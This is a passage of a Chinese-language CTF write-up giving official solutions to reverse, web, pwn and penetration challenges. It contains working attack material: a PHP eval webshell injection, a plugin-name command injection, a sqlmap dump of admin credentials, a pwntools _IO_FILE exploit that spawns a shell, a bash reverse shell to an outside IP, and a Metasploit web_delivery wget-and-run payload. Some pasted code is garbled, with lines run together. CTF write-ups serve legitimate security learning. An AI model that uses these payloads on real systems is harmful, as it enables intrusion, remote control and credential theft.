class="number">25</span>]-<span class="number">400</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line"><span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#flag&#123;L1sten_t0_the_s1lence_Of_extinct10n!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="bmzre"><a href="#bmzre" class="headerlink" title="bmzre"></a>bmzre</h3><p>去花指令</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/922ffc457041bfddcf7809b8d1301470.png" alt="img"></p>
<p>这里是因为ida对call函数的分析出了错误，这里的花指令将call函数当jmp使用，没有retn，只有一个add esp 4来维持堆栈平衡，直接上脚本去花</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>(<span class="params">addr,endaddr</span>):</span></span><br><span class="line">	<span class="keyword">while</span>(addr&lt;endaddr): </span><br><span class="line">		PatchByte(addr,<span class="number">0x90</span>) </span><br><span class="line">		addr+=1<span class="keyword">def</span> </span><br><span class="line">	undefine(addr,endaddr):  </span><br><span class="line">	<span class="keyword">while</span> addr&lt;endaddr: </span><br><span class="line">		MakeUnkn(addr,<span class="number">0</span>) </span><br><span class="line">		addr+=1<span class="keyword">def</span> </span><br><span class="line">		dejunkcode(addr,endaddr):  </span><br><span class="line">			<span class="keyword">while</span> addr&lt;endaddr: </span><br><span class="line">				MakeCode(addr)  <span class="comment"># 匹配模版  </span></span><br><span class="line">				<span class="keyword">if</span> Byte(addr)==<span class="number">0xe8</span> <span class="keyword">and</span> Byte(addr+<span class="number">6</span>)==<span class="number">0x12</span> <span class="keyword">and</span> Byte(addr+<span class="number">7</span>)==<span class="number">0x83</span>:  </span><br><span class="line">					<span class="built_in">next</span>=addr+<span class="number">10</span> nop(addr,<span class="built_in">next</span>) addr=<span class="built_in">next</span> <span class="keyword">continue</span> addr+=ItemSize(addr)dejunkcode(<span class="number">0x00401000</span>,<span class="number">0x00411E40</span>)</span><br></pre></td></tr></table></figure>

<p>flag的长度为32位</p>
<p>将flag分成两段，分别通过两个函数去检查</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/43f1bef9a450aad88948debca3cf69a2.png" alt="img"></p>
<p>第一个检查函数,考察负数的表示方法和使用</p>
<p>对输入的字符进行-109操作，这里考察了char类型</p>
<p>一个字节的范围是 0x00-0xff</p>
<p>char类型强制类型转化的话可以看作有符号整数</p>
<p>这里所比较的字符串为负数 所以写脚本的时候需要+0x100</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m=[<span class="number">0xc8</span>,<span class="number">0xf4</span>,<span class="number">0xf5</span>,<span class="number">0xc7</span>,<span class="number">0xc5</span>,<span class="number">0xc3</span>,<span class="number">0xf9</span>,<span class="number">0xc6</span>,<span class="number">0xf7</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>,<span class="number">0xc7</span>,<span class="number">0xca</span>,<span class="number">0xf8</span>,<span class="number">0xc3</span>,<span class="number">0xc4</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m: </span><br><span class="line">	flag+=<span class="built_in">chr</span>(i+<span class="number">109</span>-<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2d35a497923e5921c632c73962d89ca9.png" alt="img"></p>
<p>第二个检查函数考察了古典密码的替换类型，简单的替换</p>
<p>key是2103</p>
<p>没四个字符为一组，以key=2103的方式进行替换</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/34cb11990addaec148f2afa074be62bd.png" alt="img"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flagbmz</span>&#123;<span class="number">5</span>ab<span class="number">420</span>f<span class="number">3</span>d<span class="number">8547</span>e<span class="number">01</span>a<span class="number">1846</span>a<span class="number">15</span>db<span class="number">0209</span>e<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>1给了源码！审计一下：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">if</span>(isset($_GET[<span class="string">&#x27;re&#x27;</span>]))&#123; <span class="selector-tag">file_put_contents</span>(<span class="string">&quot;./config.php&quot;</span>,base64_decode(<span class="string">&quot;PD9waHAKJExBTkdbJ21lbWJlcl9tYW5hZ2UnXSA9ICdhZG1pbic7Cj8+Cg==&quot;</span>));&#125;</span><br></pre></td></tr></table></figure>

<p>发现re可以给config赋值！ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;member_manage&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;?</span><br></pre></td></tr></table></figure>

<p>这有什么用呢！</p>
<p>我们本地测试一下：</p>
<p>第一次：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Sudo</span>=<span class="number">1</span>info[name]=<span class="number">1</span>&amp;no<span class="number">1</span>=<span class="number">1</span>’</span><br></pre></td></tr></table></figure>

<p>写入config里的内容是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;1&#x27;</span>] = ‘<span class="number">1</span>’’;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二次请求：</p>
<p>发送与第一次相同的 POST 请求</p>
<p><code>require $file;</code> 引入语言文件得到 <code>$LANG[$key]</code> 的值是 <code>string(2) &quot;1&#39;&quot;</code>，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新 $LANG[$key] 的值的</p>
<p>但是因为 require 和 file_get_contents 函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language 会被转义处理得到的值是 <code>string(3) &quot;1&#39;&quot;</code></p>
<p>于是判断 <code>$LANG[$key]!=$_POST[&#39;language&#39;]</code> 就成立了，接着 str_replace 函数进行字符串替换操作，把原来的 <code>$LANG[&#39;1&#39;] = &#39;1&#39;&#39;;</code> 中的 1’ 替换成 1’，最终写入文件</p>
<p>最后文件内容变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;1&#x27;</span>] = ‘<span class="number">1</span>’’;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>知道上面的知识点：就可以写shell了！</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">Sudo =1&amp;info[name]=member_manage&amp;no1=&#x27;?&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">111111</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[upload]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>1.抓包，发现fastjson格式。</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/85c801350b2db0c58ab725eb1083a170.png" alt="img"></p>
<p>2.探测fastjson版本为:1.2.68</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/f2206b3cdb470c233c9d59fc0c5dee54.png" alt="img"></p>
<p>3.使用fast_json_rce辅助进行rce或者getshell</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/ed53183dd2932b646d48ac5d17c41a3a.png" alt="img"></p>
<p>zbl og-scshop </p>
<p>扫描目录发现web.zip，robots.txt存在zblog目录</p>
<p>scshop前台存在sql注入，这里利用订阅处的一个sql</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2bcb4f8a60e59df6d42400d4ec203a6d.png" alt="img"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /Core/Program/Ant_Rponse.php?actions=SubNewsletter&amp;lgid=<span class="number">1</span> HTTP/<span class="number">1</span>.<span class="number">1</span>Host: ctf.bmzclub.cn:<span class="number">9932</span>User-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">99</span>.<span class="number">0</span>.<span class="number">7113</span>.<span class="number">93</span> Safari/<span class="number">537</span>.<span class="number">36</span>Accept: */*Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-<span class="number">8</span>X-Requested-With: XMLHttpRequestContent-Length: <span class="number">49</span>Origin: http://ctf.bmzclub.cn:<span class="number">9932</span>Connection: closeReferer: http://ctf.bmzclub.cn:<span class="number">9932</span>/e_ml=aaaa%<span class="number">40</span>qq.com&amp;e_couid=<span class="number">1</span>*&amp;e_coucode=SEMCMS</span><br><span class="line"><span class="attribute">python3</span> .sqlmap.py -r .<span class="number">1</span>.txt --technique B -D zblogphp -T zbp_member -C  mem_Name,mem_password --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/2e341a68aab5ba4b5f8635eb2893db91.png" alt="img"></p>
<p>得到zblog管理员账号WHTadmin</p>
<p>访问</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf.bmzclub.cn:<span class="number">9932</span><span class="regexp">/zblog/</span>zb_system/login.php</span><br></pre></td></tr></table></figure>

<p>WHTadmin/admin888登陆zblog后台</p>
<p>审计可以发现在新建插件的地方，app_name的参数未进行严格过滤，导致可以写入恶意代码进行代码执行</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/80fcec9a393e2d66bc34cb9dda799ee4.png" alt="img"></p>
<p>构造</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /zblog_scshop/zblog/zb_users/plugin/AppCentre/plugin_edit.php HTTP/<span class="number">1</span>.<span class="number">1</span>Host: <span class="number">127.0.0.1</span>User-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">99</span>.<span class="number">0</span>.<span class="number">7113</span>.<span class="number">93</span> Safari/<span class="number">537</span>.<span class="number">36</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span>Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: <span class="number">503</span>Origin: http://<span class="number">127.0.0.1</span>Connection: closeReferer: http://<span class="number">127.0.0.1</span>/zblog_scshop/zblog/zb_users/plugin/AppCentre/plugin_edit.phpCookie: timezone=<span class="number">8</span>; username_b<span class="number">120</span>b<span class="number">784</span>=WHTadmin; token_b<span class="number">120</span>b<span class="number">784</span>=<span class="number">222</span>e<span class="number">898</span>db<span class="number">7</span>b<span class="number">62</span>a<span class="number">172</span>da<span class="number">21</span>c<span class="number">151</span>c<span class="number">98</span>e<span class="number">702</span>d<span class="number">5</span>b<span class="number">4</span>b<span class="number">05</span>bd<span class="number">05</span>f<span class="number">10</span>f<span class="number">83</span>af<span class="number">06474</span>e<span class="number">3</span>f<span class="number">46</span>fed<span class="number">1641208909</span>; addinfozblog_scshopzblog=%<span class="number">7</span>B%<span class="number">22</span>chkadmin%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">2</span>C%<span class="number">22</span>chkarticle%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">2</span>C%<span class="number">22</span>levelname%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">5</span>Cu<span class="number">7</span>ba<span class="number">1</span>%<span class="number">5</span>Cu<span class="number">7406</span>%<span class="number">5</span>Cu<span class="number">5458</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>userid%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">221</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>useralias%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>WHTadmin%<span class="number">22</span>%<span class="number">7</span>D; http<span class="number">304</span>ok=<span class="number">1</span>; PHPSESSID=t<span class="number">5</span>oq<span class="number">8</span>rrpgtle<span class="number">43</span>pr<span class="number">0</span>fi<span class="number">2</span>q<span class="number">92</span>kma; timezone=<span class="number">8</span>Upgrade-Insecure-Requests: <span class="number">1</span>Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?<span class="number">1</span>token=cb<span class="number">9</span>f<span class="number">630545</span>b<span class="number">265</span>fca<span class="number">60</span>f<span class="number">25</span>c<span class="number">85362905</span>b&amp;app_id=aaaaaa&amp;app_name=&#x27;;phpinfo();system($_GET[<span class="number">1</span>]);//&amp;app_url=&amp;app_note=&amp;app_adapted=<span class="number">172960</span>&amp;app_version<span class="number">1</span>=<span class="number">1</span>&amp;app_version<span class="number">2</span>=<span class="number">0</span>&amp;app_version<span class="number">3</span>=&amp;app_pubdate=<span class="number">2021</span>-<span class="number">12</span>-<span class="number">31</span>&amp;app_modified=<span class="number">2021</span>-<span class="number">12</span>-<span class="number">31</span>&amp;app_author_name=WHTadmin&amp;app_author_email=null%<span class="number">40</span>null.com&amp;app_author_url=&amp;app_path=main.php&amp;app_include=include.php&amp;app_level=<span class="number">1</span>&amp;app_phpver=<span class="number">5</span>.<span class="number">2</span>&amp;app_price=<span class="number">0</span>&amp;app_advanced_dependency=&amp;app_advanced_conflict=&amp;app_advanced_rewritefunctions=&amp;app_advanced_existsfunctions=&amp;app_description=</span><br></pre></td></tr></table></figure>

<p>去插件中心启用</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/7304d9bbdd94aea3a600332ed35ca993.png" alt="img"></p>
<p>访问</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/zblog/</span>zb_users<span class="regexp">/plugin/</span>aaaaaa/main.php</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/8f3a462d448617b0339aa1be4629637f.png" alt="img"></p>
<hr>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, offset, data, quiet=<span class="literal">False</span></span>):</span> </span><br><span class="line">	<span class="keyword">if</span> quiet: p.sendline(<span class="string">&quot;1&quot;</span>) </span><br><span class="line">		p.sendline(<span class="built_in">str</span>(size)) </span><br><span class="line">		p.sendline(<span class="built_in">str</span>(offset)) </span><br><span class="line">		p.sendline(data)  </span><br><span class="line">	<span class="keyword">else</span>: </span><br><span class="line">		p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>) </span><br><span class="line">		p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(size)) </span><br><span class="line">		p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(offset)) </span><br><span class="line">		p.sendlineafter(<span class="string">&quot;: &quot;</span>, data)<span class="comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line">		p=process(<span class="string">&quot;./goodfile&quot;</span>)elf=ELF(<span class="string">&#x27;./goodfile&#x27;</span>)</span><br><span class="line">		libc=elf.libc<span class="comment"># make chunk adjacent to libc</span></span><br><span class="line">		base = <span class="number">0x200000</span></span><br><span class="line">		space = (base + <span class="number">0x1000</span>) * <span class="number">1</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">		space = (base + <span class="number">0x1000</span>) * <span class="number">2</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, quiet=<span class="literal">True</span>)</span><br><span class="line">		libc_base = u64(p.recvline()[<span class="number">0x08</span>:<span class="number">0x10</span>]) - 0x3ed8b0success(<span class="string">&quot;libc = &quot;</span> + <span class="built_in">hex</span>(libc_base))<span class="comment"># get the shell!</span></span><br><span class="line">		space = (base + <span class="number">0x1000</span>) * <span class="number">3</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x38</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">		payload = p64(<span class="number">0xfbad208b</span>)payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0xd8</span>)</span><br><span class="line">		payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) * 6payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x2000</span>)</span><br><span class="line">		payload += <span class="string">b&#x27;&#x27;</span> * (<span class="number">8</span>*<span class="number">7</span> + <span class="number">4</span>) <span class="comment"># padding</span></span><br><span class="line">		new_size = libc_base + libc.search(<span class="string">&#x27;/bin/shx00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">		payload += p64(<span class="number">0xfbad1800</span>)payload += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">		payload += p64((new_size - <span class="number">100</span>) // <span class="number">2</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">		payload += p64((new_size - <span class="number">100</span>) // <span class="number">2</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">		payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">		payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>])</span><br><span class="line">		payload += p64(<span class="number">1</span>) + p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">		payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x3ed8c0</span>)</span><br><span class="line">		payload += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span>) + p64(<span class="number">0</span>)payload += p64(libc_base + <span class="number">0x3eb8c0</span>)</span><br><span class="line">		payload += p64(<span class="number">0</span>) * 6payload += p64(libc_base + <span class="number">0x3e8360</span>) <span class="comment"># _IO_str_jumps</span></span><br><span class="line">		payload += p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">		payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>])</span><br><span class="line">		payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>])p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line">		p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="https://img.shangyexinzhi.com/xztest-image/article/7d22056e2256095b7f8a0cab9a293fc5.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>通过搜索可以发现源码 <a target="_blank" rel="noopener" href="https://link.shangyexinzhi.com/url?https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzk0NjEyNjY5OQ%3D%3D%26mid%3D2247486623%26idx%3D1%26sn%3Da9788233c4138c763aa791888fabbcc7%26scene%3D21%23wechat_redirect">https://mp.weixin.qq.com/s/_RXDeXRTLf-hRWEaV2UCiw </a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$shellcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shellcode&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$shellcode</span>)||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  header(<span class="string">&#x27;HTTP/1.1 400 Bad Request&#x27;</span>);           <span class="comment">//返回Http错误码</span></span><br><span class="line">  <span class="keyword">echo</span> json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="string">&#x27;false&#x27;</span>]); <span class="comment">//返回错误信息</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// $url = &quot;https://service-5369sd4f-1258472441.sh.apigw.tencentcs.com/bootstrap-2.min.js&quot;;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$name</span>,<span class="variable">$path</span>,<span class="variable">$file_name</span>;</span><br><span class="line">  <span class="variable">$name</span> = md5(time()+<span class="variable">$shellcode</span>+base64_decode(<span class="variable">$shellcode</span>));</span><br><span class="line">  <span class="variable">$file_name</span> = <span class="variable">$name</span>.<span class="string">&quot;.exe&quot;</span>;</span><br><span class="line">  <span class="variable">$file_dir</span> = <span class="string">&quot;./build/&quot;</span>;       <span class="comment">//下载文件存放目录    </span></span><br><span class="line">  <span class="variable">$path</span> = <span class="variable">$file_dir</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$shellcode</span> = sprintf(<span class="string">&quot;python ./Bypass/Input.py %s %s&quot;</span>,<span class="variable">$shellcode</span>,<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">  exec(<span class="variable">$shellcode</span>,<span class="variable">$result</span>);</span><br><span class="line">  <span class="variable">$execResult</span> = <span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">  exec_callback(<span class="variable">$shellcode</span>, <span class="string">&#x27;download&#x27;</span>); </span><br></pre></td></tr></table></figure>

<p>审计可知存在任意命令执行</p>
<p>反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/116.62.104.172/6666 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/a2211938f0da2d0174ef43d5ebd70c10.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>得到flag1</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/190a309a7df0a174cc9ef33097eca227.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>上线msf</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 </span><br><span class="line">&gt; use exploit<span class="regexp">/multi/</span>script<span class="regexp">/web_delivery [*] Using configured payload python/m</span>eterpreter<span class="regexp">/reverse_tcpmsf6 exploit(multi/</span>script/web_delivery) </span><br><span class="line">&gt; set lhost <span class="number">81.69</span>.<span class="number">27.32</span>lhost =&gt; <span class="number">81.69</span>.<span class="number">27.32</span>msf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set payload linux<span class="regexp">/x64/m</span>eterpreter<span class="regexp">/reverse_tcppayload =&gt; linux/</span>x64<span class="regexp">/meterpreter/</span>reverse_tcpmsf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set lport <span class="number">8888</span>lport =&gt; <span class="number">8888</span>msf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set target <span class="number">7</span>target =&gt; <span class="number">7</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/60089cbed96b738aa34cf0504d017689.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure>

<p><img src="https://img.shangyexinzhi.com/xztest-image/article/bfba26a760ee6bdb8ad1913dbe5a7584.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>使用</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>

<p>查看该机器的网段</p>
<p><img src="https://img.shangyexinzhi.com/xztest-image/article/87ec5f40a9d3765c1984499d600fb42e.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p>
<p>添加路由</p>
